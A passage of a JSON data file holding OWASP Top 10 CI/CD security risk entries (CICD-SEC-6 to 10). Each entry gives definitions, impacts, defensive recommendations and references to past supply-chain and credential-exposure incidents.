href=\"https://www.bleepingcomputer.com/news/security/malicious-npm-packages-target-amazon-slack-with-new-dependency-attacks/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.bleepingcomputer.com/news/security/malicious-npm-packages-target-amazon-slack-with-new-dependency-attacks/</a></li><li>A vulnerability found in Teleport’s CI implementation, allowed attackers from the internet to execute a Direct-3PE attack to run a privileged container and escalate to root privilege on the node itself - leading to secret exfiltration, release of malicious artifacts, and access to sensitive systems.</li><li><a href=\"https://goteleport.com/blog/hack-via-pull-request/\" rel=\"noopener noreferrer\" target=\"_blank\">https://goteleport.com/blog/hack-via-pull-request/</a></li></ol>",
        "code": "CICD-SEC-5",
        "sort_order": 5
    },
    {
        "tags":
        [
            "CICD-SEC-6: Insufficient Credential Hygiene"
        ],
        "testcase": "Insufficient Credential Hygiene",
        "details": "<h2>Definition</h2><p>Insufficient credential hygiene risks deal with an attacker’s ability to obtain and use various secrets and tokens spread throughout the pipeline due to flaws having to do with access controls around the credentials, insecure secret management and overly permissive credentials.</p><h2></h2><h2>Description</h2><p>CI/CD environments are built of multiple systems communicating and authenticating against each other, creating great challenges around protecting credentials due to the large variety of contexts in which credentials can exist.</p><p>Application credentials are used by the application at runtime, credentials to production systems are used by pipelines to deploy infrastructure, artifacts and apps to production, engineers use credentials as part of their testing environments and within their code and artifacts.</p><p>This variety of contexts, paired with the large amount of methods and techniques for storing and using them, creates a large potential for insecure usage of credentials. Some major flaws that affect credential hygiene:</p><ul><li><strong>Code containing credentials being pushed to one of the branches of an SCM repository:</strong> This can be either by mistake - without noticing the existence of the secret in the code, or deliberately - without understanding the risk of doing that. From that moment on, the credentials are exposed to anyone with read access to the repository, and even if deleted from the branch it was pushed into - they continue to appear in the commit history, available to be viewed by anyone with repository access.</li><li><strong>Credentials used insecurely inside the build and deployment processes:</strong> These credentials are used to access code repositories, read from and write to artifact repositories, and deploy resources and artifacts to production environments. Given the large amount of pipelines and target systems they need access to, it’s imperative to understand -<ul><li>In which context, and using which method, is each set of credentials used?</li><li>Can each pipeline access only the credentials it needs to fulfill its purpose?</li><li>Can credentials be accessed by unreviewed code flowing through the pipeline?</li><li>How are these credentials called and injected to the build? Are these credentials accessible only in run-time, and only from the contexts where they are required?</li></ul></li><li><strong>Credentials in container image layers:</strong> Credentials that were only required for building the image, still exist in one of the image layers - available to anyone who is able to download the image.</li><li><strong>Credentials printed to console output:</strong> Credentials used in pipelines are often printed to the console output, deliberately or inadvertently. This might leave credentials exposed in clear-text in logs, available to anyone with access to the build results to view. These logs can potentially flow to log management systems, expanding their exposure surface.</li><li><strong>Unrotated credentials:</strong> Since the credentials are spread all over the engineering ecosystem, they are exposed to a large number of employees and contractors. Failing to rotate credentials results in a constantly growing amount of people and artifacts that are in possession of valid credentials. This is especially true for credentials used by pipelines - for example deploy keys - which are oftentimes managed using the “If it isn’t broken, don’t fix it” directive - which leaves valid credentials unrotated for many years.</li></ul><h2></h2><h2>Impact</h2><p>Credentials are the most sought-after object by adversaries, seeking to use them for accessing high-value resources or for deploying malicious code and artifacts. In this context, engineering environments provide attackers with multiple avenues to obtain credentials. The large potential for human error, paired with knowledge gaps around secure credentials management and the concern of breaking processes due to credential rotation, put the high-value resources of many organizations at the risk of compromise due the exposure of their credentials.</p><h2></h2><h2>Recommendations</h2><ul><li>Establish procedures to continuously map credentials found across the different systems in the engineering ecosystem - from code to deployment. Ensure each set of credentials follows the principle of least privilege and has been granted the exact set of permission needed by the service using it.</li><li>Avoid sharing the same set of credentials across multiple contexts. This increases the complexity of achieving the principle of least privilege as well as having a negative effect on accountability.</li><li>Prefer using temporary credentials over static credentials. In case static credentials need to be in use - establish a procedure to periodically rotate all static credentials and detect stale credentials.</li><li>Configure usage of credentials to be limited to predetermined conditions (like scoping to a specific source IP or identity) to ensure that even in case of compromise, exfiltrated credentials cannot be used outside your environment.</li><li>Detect secrets pushed to and stored on code repositories. Use controls such as an IDE plugin to identify secrets used in the local changes, automatic scanning upon each code push, and periodical scans on the repository and its past commits.</li><li>Ensure secrets that are used in CI/CD systems are scoped in a manner that allows each pipeline and step to have access to only the secrets it requires.</li><li>Use built-in vendor options or 3rd party tools to prevent secrets from being printed to console outputs of future builds. Ensure all existing outputs do not contain secrets.</li><li>Verify that secrets are removed from any type of artifact, such as from layers of container images, binaries, or Helm charts.</li></ul><h2></h2><h2>References</h2><ol><li>Thousands of credentials, stored as environment variables, were stolen by attackers through compromising Codecov, a popular code coverage tool used in the CI.</li><li><a href=\"https://about.codecov.io/security-update/\" rel=\"noopener noreferrer\" target=\"_blank\">https://about.codecov.io/security-update/</a></li><li>Travis CI injected secure environment variables of public repositories into pull request builds, causing them to be susceptible to compromise by anonymous users issuing pull requests against public repositories.</li><li><a href=\"https://travis-ci.community/t/security-bulletin/12081\" rel=\"noopener noreferrer\" target=\"_blank\">https://travis-ci.community/t/security-bulletin/12081</a></li><li>An attacker compromised the TeamCity Build server of Stack Overflow and was able to steal secrets due to their insecure storage method.</li><li><a href=\"https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/\" rel=\"noopener noreferrer\" target=\"_blank\">https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/</a></li><li>Samsung exposed overly permissive secrets in public GitLab repositories.</li><li><a href=\"https://techcrunch.com/2019/05/08/samsung-source-code-leak/\" rel=\"noopener noreferrer\" target=\"_blank\">https://techcrunch.com/2019/05/08/samsung-source-code-leak/</a></li><li>Attackers accessed Uber’s private GitHub repositories that contained permissive and shared AWS tokens, leading to data exfiltration of millions of drivers and passengers. <a href=\"https://www.ftc.gov/system/files/documents/federal_register_notices/2018/04/152_3054_uber_revised_consent_analysis_pub_frn.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.ftc.gov/system/files/documents/federal_register_notices/2018/04/152_3054_uber_revised_consent_analysis_pub_frn.pdf</a></li><li>Gaining write access to Homebrew, by Eric Holmes. The Homebrew Jenkins instance revealed environment variables of executed builds, including a GitHub token which allowed an attacker to make malicious changes to the Homebrew project itself.</li><li><a href=\"https://medium.com/@vesirin/how-i-gained-commit-access-to-homebrew-in-30-minutes-2ae314df03ab\" rel=\"noopener noreferrer\" target=\"_blank\">https://medium.com/@vesirin/how-i-gained-commit-access-to-homebrew-in-30-minutes-2ae314df03ab</a></li></ol>",
        "code": "CICD-SEC-6",
        "sort_order": 6
    },
    {
        "tags":
        [
            "CICD-SEC-7: Insecure System Configuration"
        ],
        "testcase": "Insecure System Configuration",
        "details": "<h2>Definition</h2><p>Insecure system configuration risks stem from flaws in the security settings, configuration and hardening of the different systems across the pipeline (e.g. SCM, CI, Artifact repository), often resulting in “low hanging fruits” for attackers looking to expand their foothold in the environment.</p><h2></h2><h2>Description</h2><p>CI/CD environments are comprised of multiple systems, provided by a variety of vendors. To optimize CI/CD security, defenders are required to place strong emphasis both on the code and artifacts flowing through the pipeline, and the posture and resilience of each individual system.</p><p>In a similar way to other systems storing and processing data, CI/CD systems involve various security settings and configurations on all levels - application, network and infrastructure. These settings have a major influence on the security posture of the CI/CD environments and the susceptibility to a potential compromise. Adversaries of all levels of sophistication, are always on the lookout for potential CI/CD vulnerabilities and misconfigurations that can be leveraged to their benefit.</p><p>Examples of potential hardening flaws:</p><ul><li>A self-managed system and/or component using an outdated version or lacking important security patches.</li><li>A system having overly permissive network access controls.</li><li>A self-hosted system that has administrative permissions on the underlying OS.</li><li>A system with insecure system configurations. Configurations typically determine key security features having to do with authorization, access controls, logging and more. In many cases, the default set of configurations is not secure and requires optimization.</li><li>A system with inadequate credential hygiene - for example default credentials which are not disabled, overly permissive programmatic tokens, and more.</li></ul><p>While usage of Software as a Service (SaaS) CI/CD solutions, rather than their self-hosted alternative, eliminates some of the potential risks associated with system hardening and lateral movement within the network, organizations are still required to be highly diligent in securely configuring their SaaS CI/CD solution. Each solution has its own set of unique security configurations and best practices which are essential for maintaining optimal security posture.</p><h2></h2><h2>Impact</h2><p>A security flaw in one of the CI/CD systems may be leveraged by an adversary to obtain unauthorized access to the system or worse - compromise the system and access the underlying OS. These flaws may be abused by an attacker to manipulate legitimate CI/CD flows, obtain sensitive tokens and potentially access production environments. In some scenarios, these flaws may allow an attacker to move laterally within the environment and outside the context of CI/CD systems.</p><h2></h2><h2>Recommendations</h2><ul><li>Maintain an inventory of systems and versions in use, including mapping of a designated owner for each system. Continuously check for known vulnerabilities in these components. If a security patch is available, update the vulnerable component. If not, consider removing the component / system, or reduce the potential impact of exploiting the vulnerability by restricting access to the system, or the system’s ability to perform sensitive operations.</li><li>Ensure network access to the systems is aligned with the principle of least access.</li><li>Establish a process to periodically review all system configurations for any setting that can have an effect on the security posture of the system, and ensure all settings are optimal.</li><li>Ensure permissions to the pipeline execution nodes are granted according to the principle of least privilege. A common misconfiguration in this context is around granting debug permissions on execution nodes to engineers. While in many organizations this is a common practice, it is imperative to take into consideration that any user with the ability to access the execution node in debug mode may expose all secrets while they are loaded into memory and use the node’s identity - effectively granting elevated permissions to any engineer with this permission.</li></ul><h2></h2><h2>References</h2><ol><li>The compromise of the SolarWinds build system, used to spread malware through SolarWinds to 18,000 organizations.</li><li><a href=\"https://sec.report/Document/0001628280-20-017451/#swi-20201214.htm\" rel=\"noopener noreferrer\" target=\"_blank\">https://sec.report/Document/0001628280-20-017451/#swi-20201214.htm</a></li><li>Backdoor planted in the PHP git repository. The attackers pushed malicious unreviewed code directly to the PHP main branch, ultimately resulting in a formal PHP version being spread to all PHP users. The attack presumably originated in a compromise of the PHP self-maintained git server.</li><li><a href=\"https://news-web.php.net/php.internals/113981\" rel=\"noopener noreferrer\" target=\"_blank\">https://news-web.php.net/php.internals/113981</a></li><li>An attacker compromised Stack Overflow’s TeamCity build server, which was accessible from the internet.</li><li><a href=\"https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/\" rel=\"noopener noreferrer\" target=\"_blank\">https://stackoverflow.blog/2021/01/25/a-deeper-dive-into-our-may-2019-security-incident/</a></li><li>Attackers compromised an unpatched Webmin build server, and added a backdoor to the local copy of the code after being fetched from the repository, leading to a supply chain attack on servers using Webmin.</li><li><a href=\"https://www.webmin.com/exploit.html\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.webmin.com/exploit.html</a></li><li>Nissan source code leaked after a self-managed Bitbucket instance left accessible from the internet with default credentials.</li><li><a href=\"https://www.zdnet.com/article/nissan-source-code-leaked-online-after-git-repo-misconfiguration/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.zdnet.com/article/nissan-source-code-leaked-online-after-git-repo-misconfiguration/</a></li><li>Mercedes Benz source code leaked after a self-maintained internet-facing GitLab server was made open for self-registration.</li><li><a href=\"https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/</a></li><li>A self-managed GitLab server of the New York state government was exposed to the internet, allowing anyone to self-register and log in to the system, which stored sensitive secrets.</li><li><a href=\"https://techcrunch.com/2021/06/24/an-internal-code-repo-used-by-new-york-states-it-office-was-exposed-online/\" rel=\"noopener noreferrer\" target=\"_blank\">https://techcrunch.com/2021/06/24/an-internal-code-repo-used-by-new-york-states-it-office-was-exposed-online/</a></li></ol>",
        "code": "CICD-SEC-7",
        "sort_order": 7
    },
    {
        "tags":
        [
            "CICD-SEC-8: Ungoverned Usage of 3rd Party Services"
        ],
        "testcase": "Ungoverned Usage of 3rd Party Services",
        "details": "<h2>Definition</h2><p>The CI/CD attack surface consists of an organization’s organic assets, such as the SCM or CI, and the 3rd party services which are granted access to those organic assets. Risks having to do with ungoverned usage of 3rd party services rely on the extreme ease with which a 3rd party service can be granted access to resources in CI/CD systems, effectively expanding the attack surface of the organization.</p><h2></h2><h2>Description</h2><p>It is rare to find an organization which does not have numerous 3rd parties connected to its CI/CD systems and processes. Their ease of implementation, combined with their immediate value, has made 3rd parties an integral part of the engineering day-to-day. The methods of embedding or granting access to 3rd parties are becoming more diverse and the complexities associated with implementing them are diminishing.</p><p>Taking a common SCM - GitHub SAAS - as an example, 3rd party applications can be connected through one or more of these 5 methods:</p><ul><li>GitHub Application</li><li>OAuth application</li><li>Provisioning of an access token provided to the 3rd party application</li><li>Provisioning of an SSH key provided to the 3rd party application.</li><li>Configuring webhook events to be sent to the 3rd party.</li></ul><p>Each method takes somewhere between seconds and minutes to implement, and grants 3rd parties with numerous capabilities, ranging from reading code in a single repository, all the way to fully administering the GitHub organization. Despite the potentially high level of permission these third parties are granted against the system, in many cases no special permissions or approvals are required by the organization prior to the actual implementation.</p><p>Build systems also allow easy integration of 3rd parties. Integrating 3rd parties into build pipelines is usually no more complex than adding 1-2 lines of code within the pipeline configuration file, or installing a plugin from the build system’s marketplace (e.g. actions in Github Actions, Orbs in CircleCI). The 3rd party functionality is then imported and executed as part of the Build process with full access to whatever resources are available from the pipeline stage it is executed in.</p><p>Similar methods of connectivity are available in various shapes and forms across most CI/CD systems, creating the process of governing and maintaining least privilege around 3rd party usage across the entire engineering ecosystem extremely complex. Organizations are grappling with the challenge of obtaining full visibility around which 3rd parties have access to the different systems, what methods of access they have, what level of permission/access they have been granted, and what level of permissions/access they are actually using.</p><h2></h2><h2>Impact</h2><p>Lack of governance and visibility around 3rd party implementations prevents organizations from maintaining RBAC within their CI/CD systems. Given how permissive 3rd parties tend to be, organizations are only as secure as the 3rd parties they implement. Insufficient implementation of RBAC and least privilege around 3rd parties, coupled with minimal governance and diligence around the process of 3rd party implementations create a significant increase of the organization’s attack surface.</p><p>Given the highly interconnected nature of CI/CD systems and environments, compromise of a single 3rd party can be leveraged to cause damage far outside the scope of the system the 3rd party is connected to (for example, a 3rd party with write permissions on a repository, can be leveraged by an adversary to push code to the repository which will in turn trigger a build and run the adversary’s malicious code on the build system).</p><h2></h2><h2>Recommendations</h2><p>Governance controls around 3rd party services should be implemented within every stage of the 3rd party usage lifecycle:</p><ul><li><strong>Approval</strong> - Establish vetting procedures to ensure 3rd parties granted access to resources anywhere across the engineering ecosystem are approved prior to being granted access to the environment, and that the level of permission they are granted is aligned with the principle of least privilege.</li><li><strong>Integration</strong> - Introduce controls and procedures to maintain continuous visibility over all 3rd parties integrated to CI/CD systems, including:<ul><li>Method of integration. Make sure all methods of integration for each system are covered (including marketplace apps, plugins, OAuth applications, programmatic access tokens, etc.).</li><li>Level of permission granted to the 3rd party.</li><li>Level of permission actually in use by the 3rd party.</li></ul></li><li><strong>Visibility over ongoing usage</strong> - Ensure each 3rd party is limited and scoped to the specific resources it requires access to and remove unused and/or redundant permissions. 3rd parties which are integrated as part of the Build process should run inside a scoped context with limited access to secrets and code, and with strict ingress and egress filters.</li><li><strong>Deprovisioning</strong> - Periodically review all 3rd parties integrated and remove those no longer in use.</li></ul><h2></h2><h2>References</h2><ol><li>Codecov, a popular code coverage tool used in the CI, is compromised to steal environment variables from builds.</li><li><a href=\"https://about.codecov.io/security-update/\" rel=\"noopener noreferrer\" target=\"_blank\">https://about.codecov.io/security-update/</a></li><li>Attackers compromise a GitHub user account of a DeepSource (a static analysis platform) engineer. Using the compromised account, they obtain the permissions of the DeepSource GitHub application, granting them full access to the codebase of all DeepSource clients that have installed the compromised GitHub application.</li><li><a href=\"https://discuss.deepsource.io/t/security-incident-on-deepsource-s-github-application/131\" rel=\"noopener noreferrer\" target=\"_blank\">https://discuss.deepsource.io/t/security-incident-on-deepsource-s-github-application/131</a></li><li>Attackers gain access to the database of Waydev, a git analytics platform, stealing GitHub and GitLab OAuth tokens of their customers.</li><li><a href=\"https://changelog.waydev.co/github-and-gitlab-oauth-security-update-dw98s\" rel=\"noopener noreferrer\" target=\"_blank\">https://changelog.waydev.co/github-and-gitlab-oauth-security-update-dw98s</a></li></ol>",
        "code": "CICD-SEC-8",
        "sort_order": 8
    },
    {
        "tags":
        [
            "CICD-SEC-9: Improper Artifact Integrity Validation"
        ],
        "testcase": "Improper Artifact Integrity Validation",
        "details": "<h2>Definition</h2><p>Improper artifact integrity validation risks allow an attacker with access to one of the systems in the CI/CD process to push malicious (although seemingly benign) code or artifacts down the pipeline, due to insufficient mechanisms for ensuring the validation of code and artifacts.</p><h2></h2><h2>Description</h2><p>CI/CD processes consist of multiple steps, ultimately responsible for taking code all the way from an engineer’s workstation to production. There are multiple resources being fed into each step - combining internal resources and artifacts with 3rd party packages and artifacts fetched from remote locations. The fact that the ultimate resource is reliant upon multiple sources spread across the different steps, provided by multiple contributors, creates multiple entry points through which this ultimate resource can be tampered with.</p><p>If a tampered resource was able to successfully infiltrate the delivery process, without raising any suspicion or encountering any security gates - it will most likely continue flowing through the pipeline - all the way to production - in the guise of a legitimate resource.</p><h2></h2><h2>Impact</h2><p>Improper artifact integrity validation can be abused by an adversary with a foothold within the software delivery process to ship a malicious artifact through the pipeline, ultimately resulting in the execution of malicious code - either on systems within the CI/CD process or worse - in production.</p><h2></h2><h2>Recommendations</h2><p>The prevention of improper artifact integrity validation risks requires a collection of measures, across different systems and stages within the software delivery chain. Consider the following controls:</p><ul><li>Implement processes and technologies to validate the integrity of resources all the way from development to production. When a resource is generated, the process will include signing that resource using an external resource signing infrastructure. Prior to consuming the resource in subsequent steps down the pipeline, the resource’s integrity should be validated against the signing authority. Some prevalent measures to consider in this context:<ul><li><strong>Code signing</strong> - SCM solutions provide the ability to sign commits using a unique key for each contributor. This measure can then be leveraged to prevent unsigned commits from flowing down the pipeline.</li><li><strong>Artifact verification software</strong> - Usage of tools for signing and verification of code and artifacts provide a way to prevent unverified software from being delivered down the pipeline. Examples for such projects are <a href=\"https://in-toto.io/\" rel=\"noopener noreferrer\" target=\"_blank\">in-toto</a>, <a href=\"https://slsa.dev/\" rel=\"noopener noreferrer\" target=\"_blank\">SLSA</a>, and <a href=\"https://www.sigstore.dev/\" rel=\"noopener noreferrer\" target=\"_blank\">Sigstore</a>, all part of the Linux Foundation.</li><li><strong>Configuration drift detection</strong> - Measures aimed at detecting configuration drifts (e.g. resources in cloud environments which aren’t managed using a signed IAC template), potentially indicative of resources that were deployed by an untrusted source or process.</li></ul></li><li>3rd party resources fetched from build/deploy pipelines (such as scripts imported and executed as part of the build process) should follow a similar logic - prior to using 3rd party resources, the hash of the resource should be calculated and cross referenced against the official published hash of the resource provider.</li></ul><h2></h2><h2>References</h2><ol><li>The hack of the SolarWinds build system, used to spread malware through SolarWinds to 18,000 organizations. The code of the Orion software was changed in the build system during the build process, leaving no trace in the codebase.</li><li><a href=\"https://sec.report/Document/0001628280-20-017451/#swi-20201214.htm\" rel=\"noopener noreferrer\" target=\"_blank\">https://sec.report/Document/0001628280-20-017451/#swi-20201214.htm</a></li><li>Codecov, a popular code coverage tool used in the CI, is compromised to steal environment variables from builds. Attackers gained access to the GCP (Google Cloud Platform) account hosting the Codecov script, and modified it to contain malicious code. The attack was identified by a customer comparing the hash of the script stored on GitHub with the script downloaded from the GCP account.</li><li><a href=\"https://about.codecov.io/security-update/\" rel=\"noopener noreferrer\" target=\"_blank\">https://about.codecov.io/security-update/</a></li><li>Backdoor planted in the PHP git repository, ultimately resulting in a formal PHP version being spread to all PHP users. The attackers push malicious unreviewed code directly to the PHP main branch, committing the code as if it were made by known PHP contributors.</li><li><a href=\"https://news-web.php.net/php.internals/113981\" rel=\"noopener noreferrer\" target=\"_blank\">https://news-web.php.net/php.internals/113981</a></li><li>Attackers compromise the Webmin build server, and add a backdoor to one of the application’s scripts. The backdoor continued to persist even after the compromised build server was decommissioned due to the fact that code was restored from a local backup, rather than the source control system. Webmin users were susceptible to RCE through a supply chain attack for a duration of over 15 months, until the backdoor was removed.</li><li><a href=\"https://www.webmin.com/exploit.html\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.webmin.com/exploit.html</a></li></ol>",
        "code": "CICD-SEC-9",
        "sort_order": 9
    },
    {
        "tags":
        [
            "CICD-SEC-10: Insufficient Logging and Visibility"
        ],
        "testcase": "Insufficient Logging and Visibility",
        "details": "<h2>Definition</h2><p>Insufficient logging and visibility risks allow an adversary to carry out malicious activities within the CI/CD environment without being detected during any phase of the attack kill chain, including identifying the attacker’s TTPs (Techniques, Tactics and Procedures) as part of any post-incident investigation.</p><h2></h2><h2>Description</h2><p>The existence of strong logging and visibility capabilities is essential for an organization’s ability to prepare for, detect and investigate a security related incident.</p><p>While workstations, servers, network devices and key IT and business applications are typically covered in depth within an organization’s logging and visibility programs, it is often not the case with systems and processes in engineering environments.</p><p>Given the amount of potential attack vectors leveraging engineering environments and processes it is imperative that security teams build the appropriate capabilities to detect these attacks as soon as they happen. As many of these vectors involve leveraging programmatic access against the different systems, a key aspect of facing this challenge is to create strong levels of visibility around both human and programmatic access.</p><p>Given the sophisticated nature of CI/CD attack vectors, there is an equal level of importance to both the audit logs of the systems - e.g. user access, user creation, permission modification, and the applicative logs - e.g. push event to a repo, execution of builds, upload of artifacts.</p><h2></h2><h2>Impact</h2><p>With adversaries gradually shifting their focus to engineering environments as a means to achieve their goals, organizations which do not ensure the appropriate logging and visibility controls around those environments, may fail to detect a breach, and face great difficulties in mitigation/remediation due to minimal investigative capabilities.</p><p>Time and data are the most valuable commodities to an organization under attack. The existence of all relevant data sources in a centralized location may be the difference between a successful and devastating outcome in an incident response scenario.</p><h2></h2><h2>Recommendations</h2><p>There are several elements to achieving sufficient logging and visibility:</p><ul><li><strong>Mapping the environment</strong> - Strong visibility capabilities cannot be achieved without an intimate level of familiarity with all the different systems involved in potential threats. A potential breach may involve any of the systems which take part in the CI/CD processes, including SCM, CI, Artifact repositories, package management software, container registries, CD, and orchestration engines (e.g. K8s).</li><li>Identify and build an inventory of all the systems in use within the organization, containing every instance of these systems (specifically relevant for self-managed systems e.g. Jenkins).</li><li><strong>Identifying and enabling the appropriate log sources</strong> - Once all relevant systems are identified, the next step is ensuring that all relevant logs are enabled, as this is not the default state in the different systems. Visibility should be optimized around both human access as well as programmatic access through all the various measures it is allowed. It is important to place an equal level of emphasis on identifying all relevant audit log sources, as well as the applicative log sources.</li><li><strong>Shipping logs to a centralized location</strong> (e.g. SIEM), to support aggregation and correlation of logs between different systems for detection and investigation.</li><li><strong>Creating alerts to detect anomalies and potential malicious activity</strong>, both in each system on its own and anomalies in the code shipping process, which involves multiple systems and requires deeper knowledge in the internal build and deployments processes.</li></ul><h2></h2><h2>References</h2><p>Logging and visibility capabilities are essential and relevant for being able to detect and investigate any incident, regardless of the risk that was exploited in the incident. Any security incident in recent years involving CI/CD systems required the victim organization to have strong visibility to be able to properly investigate and understand the extent of damage of the attack in question.</p>",
        "code": "CICD-SEC-10",
        "sort_order": 10
    }
]
